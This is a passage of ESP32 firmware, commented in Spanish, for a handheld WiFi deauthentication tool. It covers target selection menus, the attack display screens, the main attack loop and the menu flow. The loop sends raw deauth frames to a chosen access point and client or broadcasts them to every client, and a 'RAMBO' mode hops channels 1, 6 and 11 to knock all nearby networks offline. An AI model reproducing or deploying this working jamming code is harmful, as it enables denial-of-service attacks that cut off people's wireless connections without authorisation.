        bool selected = (idx == cursor);

        if (selected) tft.fillRect(5, y, 310, rowH - 2, UI_SELECT);

        uint16_t colMain = selected ? UI_BG : UI_MAIN;
        uint16_t colSub  = selected ? UI_BG : UI_ACCENT;

        if (idx == 0) {
            drawStringCustom(10, y + 4, "ALL CLIENTS", colMain, 2);
            drawStringCustom(10, y + 18, "Broadcast deauth (FF:FF:FF..)",
                             colSub, 1);
        } else if (idx == clientCount + 1) {
            drawStringCustom(10, y + 7, "< RESCAN", colMain, 2);
        } else {
            int cIdx = idx - 1;
            ClientInfo& c = clients[cIdx];
            drawStringCustom(10, y + 4, c.macStr, colMain, 2);
            drawStringCustom(10, y + 18, String(c.rssi) + " dBm",
                             colSub, 1);

            int bars = rssiBars(c.rssi);
            int bx = 280, by = 20;
            for (int b = 0; b < 4; b++) {
                int bh = 3 + b * 2;
                uint16_t col = (b < bars)
                    ? (selected ? UI_BG : (bars >= 3 ? TFT_GREEN :
                                           bars >= 2 ? TFT_YELLOW : TFT_ORANGE))
                    : (selected ? UI_BG : UI_ACCENT);
                if (b < bars) tft.fillRect(bx + b*5, by - bh, 3, bh, col);
                else          tft.drawRect(bx + b*5, by - bh, 3, bh, col);
            }
        }
    }

    tft.drawFastHLine(0, 215, 320, UI_ACCENT);
    drawStringCustom(10, 222, "OK:DEAUTH  OK(HOLD):BACK", UI_ACCENT, 1);
}

// Devuelve: -3=BACK, -2=RESCAN, -1=ALL, 0..clientCount-1 = client
static int selectTarget() {
    int cursor = 0;
    int scrollOffset = 0;
    int totalItems = clientCount + 2;

    drawClientList(cursor, scrollOffset);

    while (true) {
        if (pressedPin(BTN_UP)) {
            cursor = (cursor - 1 + totalItems) % totalItems;
            if (cursor < scrollOffset) scrollOffset = cursor;
            if (cursor >= scrollOffset + VISIBLE_ROWS)
                scrollOffset = cursor - VISIBLE_ROWS + 1;
            beep(2100, 20);
            drawClientList(cursor, scrollOffset);
            delay(180);
        }
        if (pressedPin(BTN_DOWN)) {
            cursor = (cursor + 1) % totalItems;
            if (cursor < scrollOffset) scrollOffset = cursor;
            if (cursor >= scrollOffset + VISIBLE_ROWS)
                scrollOffset = cursor - VISIBLE_ROWS + 1;
            beep(2100, 20);
            drawClientList(cursor, scrollOffset);
            delay(180);
        }
        if (pressedPin(BTN_BACK)) {
            beep(1000, 40);
            waitRelease(BTN_BACK);
            return -3;
        }
        if (pressedPin(BTN_AUX)) {
            beep(1500, 40);
            waitRelease(BTN_AUX);
            return -2;
        }
        if (pressedPin(BTN_OK)) {
            beep(1800, 40);
            waitRelease(BTN_OK);
            if (cursor == 0)              return -1;   // ALL
            if (cursor == clientCount + 1) return -2;  // RESCAN
            return cursor - 1;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  PANTALLA DE ATAQUE
// ═══════════════════════════════════════════════════════════════════════════
static void drawAttackFrame() {
    drawOledHeader("DEAUTHING", "ON");
    u8g2.setFont(u8g2_font_5x7_tr);
    if (ramboMode) {
        u8g2.drawStr(4, 25, "Mode: RAMBO all APs");
        u8g2.drawStr(4, 35, "CH: 1/6/11 hop");
        u8g2.drawStr(4, 45, "Target: broadcast");
    } else {
        u8g2.drawStr(4, 25, fitOledText("AP: " + activeAP.ssid, 120).c_str());
        if (broadcastMode) {
            u8g2.drawStr(4, 35, "Target: ALL");
        } else {
            u8g2.drawStr(4, 35, fitOledText("T: " + macToStr(activeTargetMac), 120).c_str());
        }
        u8g2.drawStr(4, 45, ("CH: " + String(activeAP.channel)).c_str());
    }
    drawOledFooter("BACK stop");
    u8g2.sendBuffer();
    return;

    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, TFT_RED);
    tft.drawRect(1, 1, 318, 238, TFT_RED);

    drawStringBig(10, 10, "DEAUTHING", TFT_RED, 1);
    drawStringCustom(225, 16, "[ACTIVE]", TFT_GREEN, 1);
    tft.drawFastHLine(0, 36, 320, TFT_RED);

    // Info
    if (ramboMode) {
        drawStringCustom(10, 44, "Mode:   RAMBO (all APs)", UI_MAIN, 1);
        drawStringCustom(10, 58, "Channels: 1 / 6 / 11 hop", UI_MAIN, 1);
        drawStringCustom(10, 72, "Targets: broadcast",       UI_MAIN, 1);
    } else {
        String s = activeAP.ssid;
        drawStringFit(10, 44, "AP:     " + s, UI_MAIN, 300, 1);
        if (broadcastMode) {
            drawStringCustom(10, 58, "Target: ALL (broadcast)", UI_MAIN, 1);
        } else {
            drawStringCustom(10, 58, "Target: " + macToStr(activeTargetMac),
                             UI_MAIN, 1);
        }
        drawStringCustom(10, 72, "Channel: " + String(activeAP.channel),
                         UI_MAIN, 1);
    }

    tft.drawFastHLine(10, 86, 300, UI_ACCENT);

    drawStringCustom(10, 100, "Time:",    UI_ACCENT, 1);
    drawStringCustom(10, 128, "Packets:", UI_ACCENT, 1);
    drawStringCustom(10, 156, "Rate:",    UI_ACCENT, 1);

    tft.drawRect(10, 185, 300, 14, UI_ACCENT);

    tft.drawFastHLine(0, 212, 320, TFT_RED);
    drawStringCustom(10, 220, "OK (HOLD): STOP", TFT_RED, 1);
}

static void drawAttackStats(unsigned long elapsed, unsigned long pkts,
                            float rate) {
    {
    drawOledHeader("DEAUTHING", "ON");
    u8g2.setFont(u8g2_font_5x7_tr);
    if (ramboMode) {
        u8g2.drawStr(4, 24, "RAMBO all APs");
    } else {
        u8g2.drawStr(4, 24, fitOledText(activeAP.ssid, 120).c_str());
    }
    u8g2.drawStr(4, 35, ("Time: " + formatTime(elapsed)).c_str());
    u8g2.drawStr(4, 45, ("Pkt: " + String(pkts)).c_str());
    char rbuf[24];
    snprintf(rbuf, sizeof(rbuf), "Rate: %d pkt/s", (int)rate);
    u8g2.drawStr(4, 54, rbuf);
    u8g2.drawFrame(98, 47, 26, 6);
    u8g2.drawBox(100, 49, random(3, 22), 2);
    u8g2.sendBuffer();
    return;
    }

    tft.fillRect(100, 96, 210, 14, TFT_BLACK);
    drawStringCustom(100, 100, formatTime(elapsed), TFT_YELLOW, 2);

    tft.fillRect(100, 124, 210, 14, TFT_BLACK);
    drawStringCustom(100, 128, String(pkts), TFT_GREEN, 2);

    tft.fillRect(100, 152, 210, 14, TFT_BLACK);
    char rbuf[24];
    snprintf(rbuf, sizeof(rbuf), "%d pkt/s", (int)rate);
    drawStringCustom(100, 156, String(rbuf), TFT_CYAN, 2);

    tft.fillRect(12, 187, 296, 10, TFT_BLACK);
    int fillW = random(60, 290);
    tft.fillRect(12, 187, fillW, 10, TFT_RED);
}

// ═══════════════════════════════════════════════════════════════════════════
//  LOOP DE ATAQUE
// ═══════════════════════════════════════════════════════════════════════════
static void runAttackLoop() {
    drawAttackFrame();
    beep(3000, 40); delay(20);
    beep(3600, 60); delay(20);
    beep(2400, 80);

    // ── Setup WiFi para raw tx ──────────────────────────────────────────
    WiFi.mode(WIFI_MODE_NULL);
    delay(50);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);

    // En modo Rambo rotamos canales, si no, fijamos uno
    const int ramboChannels[] = {1, 6, 11};
    int ramboIdx = 0;

    if (!ramboMode) {
        esp_wifi_set_channel(activeAP.channel, WIFI_SECOND_CHAN_NONE);
    } else {
        esp_wifi_set_channel(ramboChannels[0], WIFI_SECOND_CHAN_NONE);
    }

    deauthPackets = 0;
    unsigned long startMs         = millis();
    unsigned long lastStatsUpdate = millis();
    unsigned long lastChannelHop  = millis();
    unsigned long lastPktCount    = 0;
    float rate = 0;

    const uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    bool stopAttack = false;
    while (!stopAttack) {
        // ── Enviar deauth(s) ───────────────────────────────────────────
        if (ramboMode) {
            // Atacar a cada AP que coincida con el canal actual
            int curChan = ramboChannels[ramboIdx];
            for (int i = 0; i < apCount; i++) {
                if (aps[i].channel == curChan) {
                    // Broadcast deauth: source=BSSID del AP, dest=FF:FF:..
                    sendDeauth(broadcastMac, aps[i].bssid);
                    // También deauth en sentido inverso (AP → cliente)
                    // para tirar la conexión desde ambos lados
                    sendDeauth(aps[i].bssid, aps[i].bssid);
                }
            }
        } else {
            const uint8_t* targetMac = broadcastMode ? broadcastMac
                                                      : activeTargetMac;
            sendDeauth(targetMac, activeAP.bssid);
            // Reverse deauth también
            if (!broadcastMode) {
                sendDeauth(activeAP.bssid, activeAP.bssid);
            }
        }

        // ── Channel hop cada 500ms en Rambo ────────────────────────────
        if (ramboMode && millis() - lastChannelHop > 500) {
            ramboIdx = (ramboIdx + 1) % 3;
            esp_wifi_set_channel(ramboChannels[ramboIdx],
                                 WIFI_SECOND_CHAN_NONE);
            lastChannelHop = millis();
        }

        // ── Update UI cada 250 ms ──────────────────────────────────────
        if (millis() - lastStatsUpdate > 250) {
            unsigned long now   = millis();
            unsigned long delta = deauthPackets - lastPktCount;
            unsigned long dt    = now - lastStatsUpdate;
            rate = (delta * 1000.0f) / dt;
            lastPktCount    = deauthPackets;
            lastStatsUpdate = now;

            drawAttackStats(now - startMs, deauthPackets, rate);
        }

        // ── Detectar OK HOLD ───────────────────────────────────────────
        if (pressedPin(BTN_BACK) || pressedPin(BTN_AUX)) {
            stopAttack = true;
        }

        yield();
        delay(15);
    }

    // ── Cleanup ─────────────────────────────────────────────────────────
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_deinit();
    delay(100);

    beep(1800, 40); delay(20);
    beep(1200, 60);

    while (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW || digitalRead(BTN_AUX) == LOW) delay(5);
    delay(150);
}

// ═══════════════════════════════════════════════════════════════════════════
//  MAIN
// ═══════════════════════════════════════════════════════════════════════════
void runDeauther() {
    // Esperar liberación de OK
    while (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW || digitalRead(BTN_AUX) == LOW) delay(5);
    delay(100);

    // 1. Disclaimer principal
    if (!showDisclaimer()) return;

    // Loop principal
    while (true) {
        // 2. Scan APs si no hay
        if (apCount == 0) scanAPs();

        if (apCount == 0) {
            drawOledMessage("NO APs", "No hay redes WiFi", "detectadas.", "OK/AUX res BK salir");

            while (true) {
                if (pressedPin(BTN_OK) || pressedPin(BTN_AUX)) {
                    beep(2000, 40);
                    while (digitalRead(BTN_OK) == LOW || digitalRead(BTN_AUX) == LOW) delay(5);
                    break;
                }
                if (pressedPin(BTN_BACK)) {
                    beep(1000, 60);
                    waitRelease(BTN_BACK);
                    return;
                }
                delay(20);
            }
            continue;
        }

        // 3. Seleccionar AP o RAMBO
        int apChoice = selectAP();

        if (apChoice == -3) break;          // BACK
        if (apChoice == -2) {               // RESCAN
            apCount = 0;
            continue;
        }

        if (apChoice == -1) {               // RAMBO
            if (!confirmRambo()) continue;
            ramboMode = true;
            broadcastMode = true;
            runAttackLoop();
            ramboMode = false;
            continue;
        }

        // AP específico seleccionado
        activeAP = aps[apChoice];
        ramboMode = false;

        // 4. Select action: broadcast vs scan clients
        int action = selectAction(activeAP);
        if (action == -1) continue;         // BACK al selector de AP

        if (action == 0) {
            // BROADCAST directo
            broadcastMode = true;
            runAttackLoop();
            continue;
        }

        // action == 1 → SCAN CLIENTS
        scanClients(activeAP);

        if (clientCount == 0) {
            drawOledMessage("NO CLIENTS", "No hay clientes", "Puedes usar broadcast.", "OK/BACK continuar");

            while (digitalRead(BTN_OK) == HIGH && digitalRead(BTN_BACK) == HIGH) delay(20);
            while (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) delay(5);
            continue;
        }

        // 5. Select target (cliente o ALL)
        while (true) {
            int target = selectTarget();

            if (target == -3) break;                // BACK → action menu
            if (target == -2) {                     // RESCAN clients
                scanClients(activeAP);
                if (clientCount == 0) break;
                continue;
            }

            if (target == -1) {
                // ALL clients
                broadcastMode = true;
            } else {
                // Target específico
                broadcastMode = false;
                memcpy(activeTargetMac, clients[target].mac, 6);
            }

            runAttackLoop();
        }
    }
}
